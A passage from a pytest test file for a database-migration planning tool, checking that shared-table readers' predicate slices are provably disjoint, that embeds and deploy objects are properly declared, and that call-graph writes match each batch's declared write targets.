    spec = {"objects": [{**UNBOUNDED["objects"][0], "target_where": where}]}
    assert fn["bounded_predicate"](where, SCOPE)
    assert fn["bounded_readers"](spec, "mig.t") == ""


def _slices(where):
    return _functions()["predicate_slices"](where, SCOPE)


@pytest.mark.parametrize("a, b", [
    ("run_date = '${as_of}'", "run_date = '${prior_as_of}'"),
    ("run_date = '${as_of}'", "RUN_DATE = ${prior}"),
    ("unit_id = 'u1'", "unit_id = 'u2'"),
    ("unit_id = 'u1'", "t.UNIT_ID = 'U1'"),
    ("batch_id IN (1, 2)", "batch_id IN (3, 4)"),
    ("batch_id = 1", "batch_id IN (2, 3)"),
    ("run_date < '2024-02-01'", "run_date >= '2024-02-01'"),
    ("run_date BETWEEN '2024-01-01' AND '2024-01-31'", "run_date BETWEEN '2024-02-01' AND '2024-02-29'"),
    ("run_date BETWEEN DATE '2024-01-01' AND DATE '2024-01-31'", "run_date > DATE '2024-01-31'"),
    ("batch_id <= 10", "11 <= batch_id"),
    ("batch_id > 10", "batch_id = 10"),
    ("unit_id = 'u1' AND run_date = '${as_of}'", "unit_id = 'u2' AND run_date = '${as_of}'"),
    ("unit_id = 'u1' AND run_date = '${as_of}'", "unit_id = 'u1' AND run_date = '${prior}'"),
    ("region = 'eu' OR region = 'us'", "region = 'apac' OR region = 'latam'"),
    ("(region = 'eu' AND run_id = 1) OR region = 'us'", "region = 'apac'"),
    ("1 = 1 AND unit_id = 'u1'", "unit_id = 'u2' AND deleted_at IS NULL"),
])
def test_slices_of_two_readers_are_disjoint_when_the_predicates_prove_it(a, b):
    """Two readers of a shared table may each recon their own slice only when the predicates cannot select
    the same row: equality or IN on a scope column with no value in common, non-overlapping literal ranges,
    or a pin on differently named parameters (each run supplies its own; the same name is the same value).
    An AND is separated by any one column, an OR only when every branch is."""
    fn = _functions()
    assert fn["disjoint_slices"](_slices(a), _slices(b)) and fn["disjoint_slices"](_slices(b), _slices(a))
    check = fn["check_write_targets"]
    check([B1], OTHERS, _specs(u1={"objects": [{**UNBOUNDED["objects"][0], "target_where": a}]},
                               u2={"objects": [{**UNBOUNDED["objects"][0], "target_where": b}]}))


@pytest.mark.parametrize("a, b", [
    ("run_date = '${as_of}'", "run_date = '${as_of}'"),
    ("run_date = '${as_of}'", "RUN_DATE = ${as_of}"),
    ("run_date = '${as_of}'", "run_date = '2024-01-01'"),
    ("run_date = '${as_of}'", "unit_id = 'u1'"),
    ("unit_id = 'u1'", "unit_id = 'u1'"),
    ("unit_id = 'u1'", "unit_id IN ('u1', 'u2')"),
    ("unit_id LIKE 'u1%'", "unit_id LIKE 'u2%'"),
    ("unit_id LIKE 'u1%'", "unit_id = 'u2'"),
    ("run_date < '2024-02-01'", "run_date > '2024-01-15'"),
    ("run_date <= '2024-02-01'", "run_date >= '2024-02-01'"),
    ("run_date BETWEEN '2024-01-01' AND '2024-02-15'", "run_date BETWEEN '2024-02-01' AND '2024-02-29'"),
    ("batch_id < 10", "batch_id < 20"),
    ("batch_id > 10", "batch_id = 11"),
    ("batch_id > ${lo}", "batch_id < ${hi}"),
    ("batch_id > 10", "batch_id < '20'"),
    ("unit_id = 'u1' AND run_date = '${as_of}'", "unit_id = 'u1' AND run_date = '${as_of}'"),
    ("region = 'eu' OR region = 'us'", "region = 'us' OR region = 'apac'"),
    ("(region = 'eu' AND run_id = 1) OR region = 'us'", "region = 'us' AND run_id = 2"),
    ("region = 'eu' OR unit_id = 'u1'", "region = 'us'"),
])
def test_shared_table_readers_whose_slices_may_overlap_halt_naming_both_units(a, b):
    """Overlap, or scopes the workflow cannot prove apart (a parameter against a literal, LIKE prefixes,
    pins on different columns, ranges the same value satisfies), halts before launch naming the table and
    both readers, whichever wave each is in."""
    fn = _functions()
    assert not fn["disjoint_slices"](_slices(a), _slices(b))
    check = fn["check_write_targets"]
    u1 = {"objects": [{**UNBOUNDED["objects"][0], "target_where": a}]}
    u2 = {"objects": [{**UNBOUNDED["objects"][0], "target_where": b}]}
    with pytest.raises(SystemExit, match=r"'mig.t'.*u1 .*u2 \(wave-1\.json b-2\).*overlap"):
        check([B1], OTHERS, _specs(u1=u1, u2=u2))
    with pytest.raises(SystemExit, match=r"'mig.t'.*overlap"):
        check([{**B1, "units": ["u1", "u3"]}], _others({**B2, "units": ["u2"]}), _specs(u1=u1, u3=u2, u2=PRIOR))


def test_reader_slices_are_the_union_of_every_object_and_embed_reading_the_table():
    """Every read of the table is a slice the other readers must be apart from: each object's and, since the
    harness scopes an embed's nested reads by the embed's own predicate, each embed's (on its own
    scope_columns or the object's)."""
    fn = _functions()
    two = {"objects": [{**UNBOUNDED["objects"][0], "target_where": "region = 'eu'"},
                       {**UNBOUNDED["objects"][0], "object": "MIG.T", "target_where": "region = 'us'",
                        "embeds": [{"array_path": "items", "target_where": "run_id = 7"},
                                   {"array_path": "lines", "scope_columns": ["line_no"], "target_where": "line_no = 1"}]},
                       {"object": "mig.other", "target_where": "region = 'apac'"}]}
    assert fn["reader_slices"](two, "mig.t") == (_slices("region = 'eu' OR region = 'us' OR run_id = 7")
                                                 + fn["predicate_slices"]("line_no = 1", ["line_no"]))
    other = fn["predicate_slices"]("region = 'apac' AND run_id = 8 AND line_no = 2", SCOPE + ["line_no"])
    assert fn["disjoint_slices"](fn["reader_slices"](two, "mig.t"), other)
    assert not fn["disjoint_slices"](fn["reader_slices"](two, "mig.t"), _slices("region = 'apac' AND run_id = 7"))
    assert fn["reader_slices"](two, "mig.none") is None


@pytest.mark.parametrize("a, b, apart", [
    ("run_date = '${as_of}'", "run_date = '${as_of}'", False),
    ("run_date = '2024-01-01'", "run_date = '2024-01-01'", False),
    ("unit_id = 'u1'", "unit_id = 'u2'", True),
])
def test_shared_table_embeds_must_be_apart_even_when_their_objects_are(a, b, apart):
    """Disjoint object predicates prove nothing about the embeds' reads: two units whose embeds recon the same
    rows of the shared table halt as an overlap; embeds apart on their own pass."""
    check = _functions()["check_write_targets"]
    u1 = {"objects": [{**UNBOUNDED["objects"][0], "target_where": "unit_id = 'u1'",
                       "embeds": [{"array_path": "items", "target_where": a}]}]}
    u2 = {"objects": [{**UNBOUNDED["objects"][0], "target_where": "unit_id = 'u2'",
                       "embeds": [{"array_path": "items", "target_where": b}]}]}
    if apart:
        check([B1], OTHERS, _specs(u1=u1, u2=u2))
    else:
        with pytest.raises(SystemExit, match=r"'mig.t'.*u1 .*u2 .*overlap"):
            check([B1], OTHERS, _specs(u1=u1, u2=u2))


@pytest.mark.parametrize("scope", [None, [], "run_date", [1], [""]])
def test_shared_table_reader_must_declare_scope_columns(scope):
    check = _functions()["check_write_targets"]
    row = {k: v for k, v in BOUNDED["objects"][0].items() if k != "scope_columns"}
    spec = {"objects": [row if scope is None else {**row, "scope_columns": scope}]}
    with pytest.raises(SystemExit, match=r"'mig.t'.*u1.*scope_columns"):
        check([B1], OTHERS, _specs(u1=spec, u2=PRIOR))


def _embedded(embed):
    return {"objects": [{**BOUNDED["objects"][0], "embeds": [{"array_path": "items", "child_table": "dbo.i", **embed}]}]}


@pytest.mark.parametrize("embed", [{}, {"target_where": ""}, {"target_where": "1 = 1"}, {"target_where": "other = 1"},
                                   {"target_where": "run_date IS NOT NULL"},
                                   {"scope_columns": ["item_run"], "target_where": "run_date = '${as_of}'"},
                                   {"scope_columns": [], "target_where": "run_date = '${as_of}'"}])
def test_embed_of_a_shared_table_reader_needs_its_own_bound(embed):
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"'mig.t'.*u1.*embed 'items'.*target_where"):
        check([B1], OTHERS, _specs(u1=_embedded(embed), u2=PRIOR))


@pytest.mark.parametrize("embed", [{"target_where": "run_date = '${as_of}'"},
                                   {"scope_columns": ["item_run", "run_date"],
                                    "target_where": "item_run = 1 AND run_date = '${as_of}'"}])
def test_embed_bounded_on_its_own_or_the_objects_scope_columns_passes(embed):
    check = _functions()["check_write_targets"]
    check([B1], OTHERS, _specs(u1=_embedded(embed), u2=PRIOR))


def test_embed_rows_must_be_a_list_of_objects():
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"u1.*embeds"):
        check([B1], OTHERS, _specs(u1={"objects": [{**BOUNDED["objects"][0], "embeds": "items"}]}, u2=PRIOR))


def test_other_wave_manifests_reads_every_wave_but_the_current_and_fails_closed(tmp_path):
    read = _functions()["other_wave_manifests"]
    (tmp_path / "wave-0.json").write_text(json.dumps({"batches": [B1]}))
    (tmp_path / "wave-1.json").write_text(json.dumps({"target_namespace": "cat.mig", "batches": [B2]}))
    (tmp_path / "wave-1.result.json").write_text("{")
    (tmp_path / "wave-1.doctor.json").write_text("{")
    (tmp_path / "wave-2.runs.jsonl").write_text("{}")
    assert read(tmp_path, "wave-0.json") == {"wave-1.json": {"target_namespace": "cat.mig", "batches": [B2]}}
    assert read(tmp_path, "wave-1.json") == {"wave-0.json": {"target_namespace": "", "batches": [B1]}}
    (tmp_path / "wave-1.json").write_text(json.dumps({"target_namespace": "cat.", "batches": [B2]}))
    with pytest.raises(SystemExit, match=r"wave-1\.json.*target_namespace"):
        read(tmp_path, "wave-0.json")
    (tmp_path / "wave-1.json").write_text(json.dumps({"batches": [B2]}))
    (tmp_path / "wave-2.json").write_text("{")
    with pytest.raises(SystemExit, match=r"wave-2\.json.*JSON"):
        read(tmp_path, "wave-0.json")


@pytest.mark.parametrize("manifest", [[], {}, {"batches": {}}, {"batches": ["b"]}, {"batches": [{"id": "b"}]},
                                      {"batches": [{"id": "b", "units": ["u"], "write_targets": "t"}]},
                                      {"batches": [{"id": "b", "units": "u", "write_targets": ["t"]}]}])
def test_other_wave_manifest_without_batch_rows_halts(tmp_path, manifest):
    read = _functions()["other_wave_manifests"]
    (tmp_path / "wave-3.json").write_text(json.dumps(manifest))
    with pytest.raises(SystemExit, match=r"wave-3\.json.*batches"):
        read(tmp_path, "wave-0.json")


def test_unit_mapping_is_none_when_absent_and_halts_when_malformed(tmp_path):
    ns = _functions()
    ns["ROOT"] = tmp_path
    assert ns["unit_mapping"]("u9") is None
    spec = tmp_path / ".migration" / "units" / "u9" / "mapping_spec.json"
    spec.parent.mkdir(parents=True)
    spec.write_text(json.dumps(BOUNDED))
    assert ns["unit_mapping"]("u9") == BOUNDED
    spec.write_text("{")
    with pytest.raises(SystemExit, match=r"u9/mapping_spec\.json.*JSON"):
        ns["unit_mapping"]("u9")


# ---------------------------------------------------------------- route by call graph (WS3.4)

FIXTURE = Path(__file__).resolve().parents[1] / "oracle-plsql" / "fixtures" / "example_dependencies.json"


def _routine(name, reads=(), writes=(), calls=()):
    return {"routine": name, "reads": list(reads), "writes": list(writes), "calls": list(calls)}


CLOSE = _routine("app.close_period", reads=["src.lg"], writes=["mig.lg"], calls=["app.log_run"])
LOG = _routine("app.log_run", writes=["mig.run_log"])
LOOP = _routine("app.retry", calls=["app.close_period"])
TARGETS = ["mig.lg", "mig.run_log", "mig.close_period"]
DEPLOYS = {"deploy_objects": ["mig.close_period"]}


def _deps(**by_unit):
    return lambda unit: by_unit.get(unit)


def test_transitive_writes_follows_calls_and_tolerates_cycles():
    writes = _functions()["transitive_writes"]
    assert writes([CLOSE, LOG, LOOP]) == {"mig.lg", "mig.run_log"}
    assert writes([LOG]) == {"mig.run_log"}
    assert writes([_routine("app.read_only", reads=["src.x"])]) == set()


def test_transitive_writes_is_case_insensitive_on_routine_and_table_names():
    writes = _functions()["transitive_writes"]
    assert writes([_routine("APP.A", writes=["MIG.T"], calls=["app.b"]), _routine("app.B", writes=["mig.t"])]) == {"mig.t"}


def test_transitive_writes_halts_on_a_callee_the_analysis_does_not_cover():
    writes = _functions()["transitive_writes"]
    with pytest.raises(SystemExit, match=r"app\.close_period.*app\.log_run"):
        writes([CLOSE])


def test_check_dependencies_passes_when_declared_targets_equal_transitive_writes():
    check = _functions()["check_dependencies"]
    b = {"id": "b", "units": ["u"], "write_targets": ["MIG.lg", "mig.run_log", "mig.close_period"], **DEPLOYS, "brief": "b"}
    check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    retry = {**b, "units": ["u", "v"], "write_targets": b["write_targets"] + ["mig.retry"],
             "deploy_objects": ["mig.close_period", "mig.retry"]}
    check([retry], _deps(u=[CLOSE, LOG], v=[LOOP]), namespace="mig")
    check([{**b, "units": ["u", "v"]}], _deps(u=[CLOSE, LOG]), namespace="mig")


def test_every_root_of_the_call_graph_is_a_declared_deploy_object():
    """The analysis lists the routines a unit converts; the ones nothing else in the batch calls are its
    entry points and ship as deployed objects (procedures, jobs, views), which collide like any table.
    An entry point absent from deploy_objects (its bare name under target_namespace, case-folded) is a mismatch;
    a callee may be inlined into its caller and needs no row."""
    check = _functions()["check_dependencies"]
    b = {"id": "b-8", "units": ["u"], "write_targets": TARGETS, **DEPLOYS, "brief": "b"}
    check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    check([{**b, "deploy_objects": ["MIG.Close_Period"]}], _deps(u=[CLOSE, LOG]), namespace="mig")
    check([{**b, "write_targets": TARGETS + ["mig.log_run"], "deploy_objects": ["mig.close_period", "mig.log_run"]}],
          _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-8.*app\.close_period.*deploy_objects"):
        check([{**b, "write_targets": ["mig.lg", "mig.run_log", "mig.other"], "deploy_objects": ["mig.other"]}],
              _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-8.*app\.retry.*deploy_objects"):
        check([{**b, "units": ["u", "v"]}], _deps(u=[CLOSE, LOG], v=[LOOP]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-8.*app\.close_period.*deploy_objects"):
        check([{**b, "write_targets": ["mig.lg", "mig.run_log"], "deploy_objects": []}], _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-8.*app\.read_only.*deploy_objects"):
        check([{**b, "write_targets": [], "deploy_objects": []}], _deps(u=[READ_ONLY]), namespace="mig")


def test_same_named_roots_in_different_schemas_each_need_a_deploy_object_of_their_own():
    """Two entry points whose trailing names agree (`app.close` and `legacy.close`) are two deployed objects:
    one deploy_objects row cannot stand for both, a row qualified like one of them is that one's, a row
    qualified like neither (`mig.other.close`) is nobody's, and a bare `mig.close` stands in only for a root
    whose trailing name no other root shares."""
    check = _functions()["check_dependencies"]
    roots = [_routine("app.close", writes=["mig.a"]), _routine("legacy.close", writes=["mig.b"])]
    b = {"id": "b-9", "units": ["u"], "write_targets": ["mig.a", "mig.b", "mig.close"], "deploy_objects": ["mig.close"], "brief": "b"}
    with pytest.raises(SystemExit, match=r"b-9.*close.*deploy_objects"):
        check([b], _deps(u=roots), namespace="mig")
    check([{**b, "write_targets": ["mig.a", "mig.b", "mig.app.close", "mig.legacy.close"],
            "deploy_objects": ["mig.app.close", "mig.legacy.close"]}], _deps(u=roots), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*legacy\.close.*deploy_objects"):
        check([{**b, "write_targets": ["mig.a", "mig.b", "mig.app.close", "mig.close"],
                "deploy_objects": ["mig.app.close", "mig.close"]}], _deps(u=roots), namespace="mig")
    check([{**b, "write_targets": ["mig.a", "mig.close"], "deploy_objects": ["mig.close"]}], _deps(u=[roots[0]]),
          namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*legacy\.close.*deploy_objects"):
        check([{**b, "write_targets": ["mig.a", "mig.b", "mig.app.close", "mig.other.close"],
                "deploy_objects": ["mig.app.close", "mig.other.close"]}], _deps(u=roots), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*app\.close.*deploy_objects"):
        check([{**b, "write_targets": ["mig.a", "mig.other.close"], "deploy_objects": ["mig.other.close"]}],
              _deps(u=[roots[0]]), namespace="mig")


@pytest.mark.parametrize("row", ["prod.app.close", "cat.other.app.close", "prod.close", "other.mig.app.close"])
def test_a_deploy_object_outside_target_namespace_never_stands_for_a_root(row):
    """A deploy_objects row is the root's only under target_namespace: `cat.mig.app.close` or the bare
    `cat.mig.close` for `app.close`, never an object of some other catalog or schema that happens to end in
    the same name (that is a production object the plan must not launch against)."""
    check = _functions()["check_dependencies"]
    root = _routine("app.close", writes=["cat.mig.a"])
    b = {"id": "b-9", "units": ["u"], "write_targets": ["cat.mig.a", row], "deploy_objects": [row], "brief": "b"}
    with pytest.raises(SystemExit, match=r"b-9.*app\.close.*deploy_objects"):
        check([b], _deps(u=[root]), namespace="cat.mig")
    for good in ("cat.mig.app.close", "cat.mig.close", "close"):
        check([{**b, "write_targets": ["cat.mig.a", good], "deploy_objects": [good]}], _deps(u=[root]),
              namespace="cat.mig")


def test_a_bare_root_takes_the_one_row_of_its_name_and_halts_when_several_could_be_it():
    """A root the analysis names without a schema (`close`) is the deploy_objects row under target_namespace
    whose trailing name is `close`: exactly one (`mig.close` or `mig.app.close`) is its row; two candidates
    (`mig.app.close` and `mig.legacy.close`) make the root ambiguous, which halts like an undeclared one rather
    than guessing; a qualified root (`app.close`) still takes only its exact spelling or the bare row."""
    check = _functions()["check_dependencies"]
    root = _routine("close", writes=["mig.a"])
    b = {"id": "b-9", "units": ["u"], "write_targets": ["mig.a", "mig.close"], "deploy_objects": ["mig.close"], "brief": "b"}
    check([b], _deps(u=[root]), namespace="mig")
    check([{**b, "write_targets": ["mig.a", "mig.app.close"], "deploy_objects": ["mig.app.close"]}], _deps(u=[root]),
          namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*close.*ambiguous.*mig\.app\.close.*mig\.legacy\.close"):
        check([{**b, "write_targets": ["mig.a", "mig.app.close", "mig.legacy.close"],
                "deploy_objects": ["mig.app.close", "mig.legacy.close"]}], _deps(u=[root]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*app\.close.*deploy_objects"):
        check([{**b, "write_targets": ["mig.a", "mig.legacy.close"], "deploy_objects": ["mig.legacy.close"]}],
              _deps(u=[_routine("app.close", writes=["mig.a"])]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-9.*app\.close.*ambiguous.*x\.app\.close.*y\.app\.close"):
        check([{**b, "write_targets": ["a", "x.app.close", "y.app.close"], "deploy_objects": ["x.app.close", "y.app.close"]}],
              _deps(u=[_routine("app.close", writes=["a"])]))


def test_a_complete_analysis_with_no_routines_is_a_graph_that_writes_and_deploys_nothing():
    """Every unit analysed and none converting a routine is a real (empty) graph: a declared table is then
    an extra nothing writes, the same mismatch as with routines. A deploy object is not: the analysis has
    rows for routines only, and a view or job the unit deploys is a deploy_objects row with no routine."""
    check = _functions()["check_dependencies"]
    b = {"id": "b-0", "units": ["u", "v"], "write_targets": [], "brief": "b"}
    check([b], _deps(u=[], v=[]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-0.*extra.*mig\.t"):
        check([{**b, "write_targets": ["mig.t"]}], _deps(u=[], v=[]), namespace="mig")
    check([{**b, "write_targets": ["mig.customer_v"], "deploy_objects": ["mig.customer_v"]}], _deps(u=[], v=[]),
          namespace="mig")


def test_check_dependencies_skips_a_batch_with_no_analysis_at_all():
    check = _functions()["check_dependencies"]
    check([{"id": "b", "units": ["u"], "write_targets": ["mig.t"], "brief": "b"}], _deps(), namespace="mig")


def test_check_dependencies_names_missing_and_extra_tables():
    check = _functions()["check_dependencies"]
    b = {"id": "b-7", "units": ["u"], "write_targets": ["mig.lg", "mig.stale", "mig.close_period"], **DEPLOYS, "brief": "b"}
    with pytest.raises(SystemExit) as e:
        check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    msg = str(e.value)
    assert "b-7" in msg
    assert re.search(r"missing.*mig\.run_log", msg)
    assert re.search(r"extra.*mig\.stale", msg)
    assert "mig.lg" not in msg.split("missing", 1)[1].split("extra", 1)[0]


def test_check_dependencies_halts_when_the_analysis_writes_nothing_the_batch_declared():
    check = _functions()["check_dependencies"]
    with pytest.raises(SystemExit, match=r"b.*extra.*mig\.t"):
        check([{"id": "b", "units": ["u"], "write_targets": ["mig.t"], "brief": "b"}],
              _deps(u=[_routine("app.read_only", reads=["src.x"])]), namespace="mig")


READ_ONLY = _routine("app.read_only", reads=["src.x"])


def test_read_only_batch_may_declare_no_targets_only_when_every_unit_is_analysed_and_writes_nothing():
    """A read-only routine still ships as a deployed object (a view, say), so the only batch with no write
    targets at all is one whose every unit is analysed and converts no routine."""
    check = _functions()["check_dependencies"]
    b = {"id": "b-3", "units": ["u"], "write_targets": [], "brief": "b"}
    check([b], _deps(u=[]), namespace="mig")
    check([{**b, "units": ["u", "v"]}], _deps(u=[], v=[]), namespace="mig")
    view = {**b, "write_targets": ["mig.read_only"], "deploy_objects": ["mig.read_only"]}
    check([view], _deps(u=[READ_ONLY]), namespace="mig")
    check([{**view, "units": ["u", "v"], "write_targets": ["mig.read_only", "mig.v"], "deploy_objects": ["mig.read_only", "mig.v"]}],
          _deps(u=[READ_ONLY], v=[_routine("app.v", reads=["src.y"])]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-3.*write_targets.*analysis"):
        check([b], _deps(), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-3.*write_targets.*analysis"):
        check([{**b, "units": ["u", "v"]}], _deps(u=[]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-3.*missing.*mig\.run_log"):
        check([b], _deps(u=[LOG]), namespace="mig")


def test_check_dependencies_with_an_unanalysed_unit_checks_only_missing_tables():
    check = _functions()["check_dependencies"]
    b = {"id": "b-4", "units": ["u", "v"], "write_targets": TARGETS + ["mig.v_only"], **DEPLOYS, "brief": "b"}
    check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-4.*missing.*mig\.run_log") as e:
        check([{**b, "write_targets": ["mig.lg", "mig.close_period", "mig.v_only"]}], _deps(u=[CLOSE, LOG]), namespace="mig")
    assert "mig.v_only" not in str(e.value)
    with pytest.raises(SystemExit, match=r"b-4.*extra.*mig\.v_only"):
        check([{**b, "deploy_objects": ["mig.close_period", "mig.read_only"], "write_targets": b["write_targets"] + ["mig.read_only"]}],
              _deps(u=[CLOSE, LOG], v=[READ_ONLY]), namespace="mig")


def test_check_dependencies_compares_targets_as_one_case_insensitive_identity():
    check = _functions()["check_dependencies"]
    b = {"id": "b", "units": ["u"], "write_targets": ["`MIG`.`Lg`", " mig.RUN_LOG ", "mig.close_period"], **DEPLOYS, "brief": "b"}
    check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    assert _functions()["transitive_writes"]([_routine("a", writes=['"MIG"."T"', "mig.t"])]) == {"mig.t"}


def _spec(*pairs):
    return {"objects": [{"object": tgt, "root_table": src, "key": ["id"]} for src, tgt in pairs]}


def _maps(**by_unit):
    return lambda unit: by_unit.get(unit)


SRC_CLOSE = _routine("app.close_period", reads=["app.period"], writes=["APP.LG"], calls=["app.log_run"])
SRC_LOG = _routine("app.log_run", writes=["app.run_log"])


def test_check_dependencies_resolves_source_writes_through_the_units_mapping_spec():
    """The analysis names the legacy tables a routine writes; the manifest names what the child deploys.
    A written source table is the target its mapping object (root_table -> object) gives it, and the
    manifest's bare names are the manifest's target_namespace, so a renamed target compares as itself."""
    check = _functions()["check_dependencies"]
    spec = _spec(("app.lg", "finance.lg"), ("APP.RUN_LOG", "run_log"))
    b = {"id": "b", "units": ["u"], "write_targets": ["mig.finance.lg", "MIG.app.run_log", "close_period"],
         "deploy_objects": ["close_period"], "brief": "b"}
    check([b], _deps(u=[SRC_CLOSE, SRC_LOG]), _maps(u=spec), "mig.app")
    with pytest.raises(SystemExit, match=r"b.*missing.*mig\.finance\.lg.*extra.*mig\.app\.lg"):
        check([{**b, "write_targets": ["app.lg", "run_log", "close_period"]}], _deps(u=[SRC_CLOSE, SRC_LOG]),
              _maps(u=spec), "mig.app")


def test_check_dependencies_resolves_a_callees_writes_through_the_callees_own_unit():
    check = _functions()["check_dependencies"]
    b = {"id": "b", "units": ["u", "v"], "write_targets": ["mig.app.lg", "mig.audit.run_log", "close_period"],
         "deploy_objects": ["close_period"], "brief": "b"}
    check([b], _deps(u=[SRC_CLOSE], v=[SRC_LOG]),
          _maps(u=_spec(("app.lg", "lg")), v=_spec(("app.run_log", "audit.run_log"))), "mig.app")
    with pytest.raises(SystemExit, match=r"missing.*mig\.app\.run_log"):
        check([b], _deps(u=[SRC_CLOSE], v=[SRC_LOG]),
              _maps(u=_spec(("app.lg", "lg")), v=_spec(("app.run_log", "run_log"))), "mig.app")


def test_check_dependencies_halts_when_a_mapped_unit_writes_a_source_table_its_mapping_does_not_name():
    check = _functions()["check_dependencies"]
    b = {"id": "b-2", "units": ["u"], "write_targets": TARGETS, **DEPLOYS, "brief": "b"}
    with pytest.raises(SystemExit, match=r"b-2.*u.*app\.run_log.*mapping_spec"):
        check([b], _deps(u=[SRC_CLOSE, SRC_LOG]), _maps(u=_spec(("app.lg", "lg"))), "mig")


def test_mapped_target_reads_the_legacy_tables_mapping_like_the_harness():
    """The harness accepts both `objects` (object/root_table) and the older `tables`
    (target_table/source_table) mapping shape; the call-graph check resolves through either."""
    mapped = _functions()["mapped_target"]
    legacy = {"tables": [{"source_table": "public.orders", "target_table": "orders", "key": ["id"]}]}
    assert mapped(legacy, "PUBLIC.ORDERS", "cat.mig") == {"cat.mig.orders"}
    assert mapped(legacy, "public.other", "cat.mig") == set()
    assert mapped({"objects": [], "tables": legacy["tables"]}, "public.orders", "mig") == {"mig.orders"}
    assert mapped({"tables": "nope"}, "public.orders") == set()
    check = _functions()["check_dependencies"]
    b = {"id": "b", "units": ["u"], "write_targets": ["cat.mig.orders", "p"], "deploy_objects": ["p"], "brief": "b"}
    check([b], _deps(u=[{"routine": "p", "reads": [], "writes": ["public.orders"], "calls": []}]),
          _maps(u=legacy), "cat.mig")


def test_a_source_table_split_over_several_mapping_objects_writes_every_one_of_them():
    """One legacy table can feed several target objects (a table and its search copy, say); a write to
    it is a write to all of them, whichever the mapping lists first, so each must be declared."""
    mapped = _functions()["mapped_target"]
    spec = _spec(("src.customer", "customer"), ("src.other", "other"), ("SRC.CUSTOMER", "customer_search"))
    assert mapped(spec, "src.customer", "mig") == {"mig.customer", "mig.customer_search"}
    check = _functions()["check_dependencies"]
    deps = _deps(u=[_routine("app.upsert", writes=["src.customer"])])
    b = {"id": "b", "units": ["u"], "write_targets": ["mig.customer", "mig.customer_search", "upsert"],
         "deploy_objects": ["upsert"], "brief": "b"}
    check([b], deps, _maps(u=spec), "mig")
    with pytest.raises(SystemExit, match=r"b.*missing.*mig\.customer_search"):
        check([{**b, "write_targets": ["mig.customer", "upsert"]}], deps, _maps(u=spec), "mig")


def test_check_dependencies_without_a_mapping_spec_keeps_the_source_name():
    check = _functions()["check_dependencies"]
    b = {"id": "b", "units": ["u"], "write_targets": ["app.lg", "app.run_log", "close_period"],
         "deploy_objects": ["close_period"], "brief": "b"}
    check([b], _deps(u=[SRC_CLOSE, SRC_LOG]), _maps(), "mig")


def test_deploy_objects_are_declared_targets_outside_the_table_comparison():
    """A procedure, view or job the unit deploys is a write target (it collides like any other) but no
    routine's DML writes it; the batch lists it in deploy_objects so the graph comparison leaves it alone.
    A deploy object that is also a written table halts (one outside write_targets fails the manifest check)."""
    check = _functions()["check_dependencies"]
    b = {"id": "b-5", "units": ["u"], "write_targets": ["mig.lg", "mig.run_log", "MIG.close_period"],
         "deploy_objects": ["mig.close_period"], "brief": "b"}
    check([b], _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-5.*extra.*mig\.close_period"):
        check([{**b, "deploy_objects": []}], _deps(u=[CLOSE, LOG]), namespace="mig")
    with pytest.raises(SystemExit, match=r"b-5.*deploy_objects.*mig\.lg.*writes"):
        check([{**b, "deploy_objects": ["mig.close_period", "mig.lg"]}], _deps(u=[CLOSE, LOG]), namespace="mig")


@pytest.mark.parametrize("value", ["x", [1], [""], ["mig.p", "MIG.P"]])
def test_manifest_deploy_objects_must_be_a_list_of_distinct_names_in_write_targets(value):
    m = _manifest()
    m["batches"][0]["deploy_objects"] = value
    m["batches"][0]["write_targets"] = m["batches"][0]["write_targets"] + ["mig.p"]
    with pytest.raises(SystemExit, match=r"deploy_objects"):
        _functions()["validate_manifest"](m)


def test_manifest_deploy_objects_outside_write_targets_halt():
    m = _manifest()
    m["batches"][0]["deploy_objects"] = ["mig.p"]
    with pytest.raises(SystemExit, match=r"deploy_objects.*mig\.p.*write_targets"):
        _functions()["validate_manifest"](m)
    m["batches"][0]["write_targets"] = m["batches"][0]["write_targets"] + ["MIG.P"]
    _functions()["validate_manifest"](m)


def test_check_dependencies_halts_on_an_uncovered_callee_naming_the_unit():
    check = _functions()["check_dependencies"]
    with pytest.raises(SystemExit, match=r"u.*app\.close_period.*app\.log_run"):
        check([{"id": "b", "units": ["u"], "write_targets": ["mig.lg"], "brief": "b"}], _deps(u=[CLOSE]))


@pytest.mark.parametrize("body", ["{", "[]", "{}", '{"routines": {}}', '{"routines": ["x"]}',
                                  '{"routines": [{"reads": []}]}',
                                  '{"routines": [{"routine": "a", "reads": "t", "writes": [], "calls": []}]}',
                                  '{"routines": [{"routine": "a", "reads": [], "writes": [1], "calls": []}]}',
                                  '{"routines": [{"routine": "a", "reads": [], "writes": []}]}',
                                  '{"routines": [{"routine": "a", "reads": [], "writes": [], "calls": []}, '
                                  '{"routine": "A", "reads": [], "writes": [], "calls": []}]}'])
def test_unit_dependencies_halts_on_a_malformed_analysis(tmp_path, body):
    ns = _functions()
    ns["ROOT"] = tmp_path
    p = tmp_path / ".migration" / "units" / "u9" / "dependencies.json"
    p.parent.mkdir(parents=True)
    p.write_text(body)
    with pytest.raises(SystemExit, match=r"u9/dependencies\.json"):
        ns["unit_dependencies"]("u9")


def test_unit_dependencies_is_none_when_absent_and_returns_the_routine_rows(tmp_path):
    ns = _functions()
    ns["ROOT"] = tmp_path
